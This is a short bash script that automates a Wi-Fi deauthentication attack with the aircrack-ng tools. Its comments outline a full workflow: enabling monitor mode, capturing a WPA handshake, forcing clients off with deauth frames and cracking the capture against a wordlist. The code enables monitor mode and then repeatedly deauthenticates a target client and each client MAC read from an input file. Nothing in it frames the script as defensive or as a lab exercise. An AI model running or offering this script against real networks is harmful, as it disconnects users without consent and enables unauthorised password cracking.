#!/bin/bash

# airmon-ng start wlanX
# airodump-ng -i wlanXmon
# airodump-ng -c <channel - no hopping> --bssid <mac of ap> --write <file> wlanXmon 
# aireplay-ng --deauth 5 -a <mac of ap> -c <client optional> wlanXmon --ignore-negative-one
# aircrack-ng <file.cap> -w <wordlist>

#echo `date`
MON=`cat /sys/class/net/wlanXmon/operstate`
if [ "$MON" != "unknown" ] ; then
        echo "$MON"
        echo "enable mon"
        airmon-ng start wlanX
#       airodump-ng -c 11 wlanXmon
fi

echo "deauth"   
aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c MAC wlanXmon

while IFS='' read -r line || [[ -n "$line" ]]; do
#       echo "text read from file: $line"
        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c $line
done < "$1"

